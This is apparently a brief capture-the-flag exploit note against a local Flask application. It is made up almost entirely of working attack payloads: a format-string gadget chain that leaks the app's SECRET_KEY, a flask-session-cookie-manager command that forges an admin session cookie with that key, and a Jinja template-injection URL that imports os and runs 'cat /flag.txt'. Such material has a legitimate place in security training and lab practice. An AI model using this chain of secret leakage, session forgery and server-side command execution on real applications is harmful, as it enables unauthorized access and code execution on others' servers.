```
{login_event.__init__.__globals__[app].config[SECRET_KEY]}
```

forge admin and ssti

```
python3 flask_session_cookie_manager3.py encode -s 'e5cf728ae2a40f6f5a85bf5a6b811a2cd4b468531cd9bc35ff368ca33897f3b3553d6f9fa159f1199c32821df8ac9dc49e5aebc6ad20df1dcc7dc61542ed8c75' -t '{"user_id":1,"username":"admin"}'
```


```
http://localhost:3002/debug?template={{%20self.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27cat /flag.txt%27).read()%20}}
```
